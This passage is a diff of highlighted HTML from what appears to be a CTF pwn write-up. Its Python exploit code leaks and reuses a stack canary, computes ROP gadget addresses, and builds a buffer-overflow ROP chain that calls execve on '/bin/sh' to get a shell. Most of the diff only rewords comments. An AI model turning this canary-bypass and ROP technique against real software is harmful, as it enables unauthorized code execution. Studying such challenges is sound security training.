 </span></span><span style="display:flex;"><span>pop_rax <span style="color:#555">=</span> base_addr7<span style="color:#555">+</span><span style="color:#f60">0x7</span> <span style="color:#09f;font-style:italic"># pop rax; ret;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Gadgets from the 2nd address region</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Gadgets from the 2nd address region (Gadget can be inspected via gdb)</span>
 </span></span><span style="display:flex;"><span>base_addr2 <span style="color:#555">=</span> ((base_2<span style="color:#555">&gt;&gt;</span><span style="color:#f60">8</span>)<span style="color:#555">&lt;&lt;</span><span style="color:#f60">8</span>)
 </span></span><span style="display:flex;"><span>syscall <span style="color:#555">=</span> base_addr2<span style="color:#555">+</span><span style="color:#f60">0x2</span> <span style="color:#09f;font-style:italic"># syscall;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Now we know the canary, we just need to build ROP Chain to exploit</span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># the BOF bug that we found during setting our name in the scoreboard.</span>
-</span></span><span style="display:flex;"><span>bin_sh_addr <span style="color:#555">=</span> base_1 <span style="color:#555">+</span> <span style="color:#f60">0x100</span> <span style="color:#09f;font-style:italic"># We will put /bin/sh\x00 string into the scoreboard name, so the base_1 will be used as the address of the execve args</span>
+</span></span><span style="display:flex;"><span>bin_sh_addr <span style="color:#555">=</span> base_1 <span style="color:#555">+</span> <span style="color:#f60">0x100</span> <span style="color:#09f;font-style:italic"># We will put /bin/sh\x00 string into the scoreboard name (which is in base_1+0x100)</span>
 </span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;/bin/sh addr: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(bin_sh_addr)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># BOF payload</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Overwrite saved rbp</span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - pop bin_sh_addr to rdi. Now rdi contain pointer to b&#39;/bin/sh\x00&#39; string</span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - pop null to rsi</span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - pop 0x3b (execve) to rax</span>
@@ -1827,10 +2408,10 @@
 </span></span><span style="display:flex;"><span>min_score <span style="color:#555">=</span> <span style="color:#f60">60</span><span style="color:#555">//</span><span style="color:#f60">5</span> <span style="color:#09f;font-style:italic"># Score to get to the scoreboard</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># What this payload do:</span>
-</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Set /bin/sh\x00 as the start of our name</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Set /bin/sh\x00 as the start of our name. This will be used by our ROP chain as our execve args.</span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Pad it with 0x20 of &#39;a&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Put our leaked canary, so that it will bypass the stack smashing check</span>
-</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Overwrite saved rbp of the previous call &amp; return address to our BOF payload</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Put our leaked canary, so that the stack smashing check is passed.</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Overwrite saved rbp of the previous call &amp; return address with our BOF payload</span>
 </span></span><span style="display:flex;"><span>play(r, min_score, p64(<span style="color:#f60">0x68732f6e69622f</span>)<span style="color:#555">+</span><span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x20</span><span style="color:#555">+</span>p64(recovered_canary)<span style="color:#555">+</span>bof_payload)
 </span></span></code></pre></td></tr></table>
 </div>
